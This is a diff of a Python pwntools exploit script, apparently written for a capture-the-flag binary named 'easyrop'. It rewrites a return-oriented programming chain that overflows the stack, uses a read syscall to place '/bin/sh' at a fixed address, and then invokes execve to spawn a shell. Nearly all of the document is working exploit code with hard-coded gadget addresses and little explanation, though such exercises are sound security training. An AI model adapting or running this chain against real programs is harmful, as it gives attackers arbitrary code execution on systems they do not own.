@@ -18,112 +18,56 @@ if(len(sys.argv) > 1):
 else:
 	p = process("./easyrop")
 
+def halfonstack(value):
+	p.send(p32(value))
+	p.send(p32(0))
 
-def send_zeros():
-	time.sleep(0.1)
-	p.send(b'\x00\x00\x00\x00')
-	time.sleep(0.1)
-	p.send(b'\x00\x00\x00\x00')
+def onstack(value):
+	onehalf = value & 0xffffffff
+	otherhalf = value >> 32
 
-pop = p64(0x00000000004001c2) # pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
-syscall = p64(0x00000000004001b3) # syscall
-len_addr = p64(0x0000000000600370)
+	halfonstack(onehalf)
+	halfonstack(otherhalf)
 
-for i in range(28):
-	time.sleep(0.1)
-	p.send(b'\x90\x90\x90\x90')
-	time.sleep(0.1)
+pop = 0x00000000004001c2 # pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
+syscall = 0x00000000004001b3 # syscall
+len_addr = 0x0000000000600370 # address of len (where we write /bin/sh)
+read_fun = 0x0400144 # read function address
 
-## Return address is the pop chain
-time.sleep(0.1)
-p.send(b'\xc2\x01\x40\x00')
-time.sleep(0.1)
-p.send(b'\x00\x00\x00\x00')
+overflow = [0x0]*7
+chain_syscall = overflow + [
+	pop, ## Return address is the pop chain
+	0, ## RDI = 0 (stdin)
+	len_addr, ## RSI = len
+	8, ## RDX = 8 = len(/bin/sh/x00)
+	0, ## RAX = 0 (read syscall)
+	syscall, ## Return address is the syscall (for the read)
+	0, ## dummy_value
+	pop, ## Return address for the pop chain
+	len_addr, ## pop rdi; flag*
+	0, ## pop rsi; argv = 0
+	0, ## pop rdx; envp = 0
+	0x3b, ## pop rax; rax = 0x3b
+	syscall
+]
 
-send_zeros()
+chain_read = overflow + [
+	pop, ## Return address is the pop chain
+	0, ## RDI = 0 (stdin)
+	len_addr, ## RSI = len
+	8, ## RDX = 8 = len(/bin/sh/x00)
+	0, ## RAX = 0 (read syscall)
+	read_fun, ## Return address is the syscall (for the read)
+	pop, ## Return address for the pop chain
+	len_addr, ## pop rdi; flag*
+	0, ## pop rsi; argv = 0
+	0, ## pop rdx; envp = 0
+	0x3b, ## pop rax; rax = 0x3b
+	syscall
+]
 
-# FIRST PART OF THE CHAIN: Write /bin/sh into len with a read syscall
-
-## RDI = 0 (stdin)
-send_zeros()
-send_zeros()
-
-## RSI = len
-time.sleep(0.1)
-p.send(b'\x70\x03\x60\x00')
-time.sleep(0.1)
-p.send(b'\x00\x00\x00\x00')
-
-send_zeros()
-
-## RDX = 8 (/bin/sh/x00)
-time.sleep(0.1)
-p.send(b'\x08\x00\x00\x00')
-time.sleep(0.1)
-p.send(b'\x00\x00\x00\x00')
-
-send_zeros()
-
-## RAX = 0 (read syscall)
-send_zeros()
-send_zeros()
-
-## Return address is the syscall (for the read)
-time.sleep(0.1)
-p.send(b'\xb3\x01\x40\x00')
-time.sleep(0.1)
-p.send(b'\x00\x00\x00\x00')
-
-send_zeros()
-
-## dummy_ret
-
-send_zeros()
-send_zeros()
-
-## Return address for the pop chain
-time.sleep(0.1)
-p.send(b'\xc2\x01\x40\x00')
-time.sleep(0.1)
-p.send(b'\x00\x00\x00\x00')
-
-send_zeros()
-
-# SECOND PART OF THE CHAIN: Pop the arguments for the execve syscall and ret to syscall
-
-## pop rdi; flag*
-time.sleep(0.1)
-p.send(b'\x70\x03\x60\x00')
-time.sleep(0.1)
-p.send(b'\x00\x00\x00\x00')
-
-send_zeros()
-
-## pop rsi; argv = 0
-send_zeros()
-send_zeros()
-
-## pop rdx; envp = 0
-send_zeros()
-send_zeros()
-
-## pop rax; rax = 0x3b
-
-time.sleep(0.1)
-p.send(b'\x3b\x00\x00\x00')
-time.sleep(0.1)
-p.send(b'\x00\x00\x00\x00')
-
-send_zeros()
-
-## return address = syscall
-
-time.sleep(0.1)
-p.send(b'\xb3\x01\x40\x00')
-time.sleep(0.1)
-p.send(b'\x00\x00\x00\x00')
-
-send_zeros()
+for i in chain_read:
+	onstack(i)
 
 input('end')
 p.send(b'\x00')
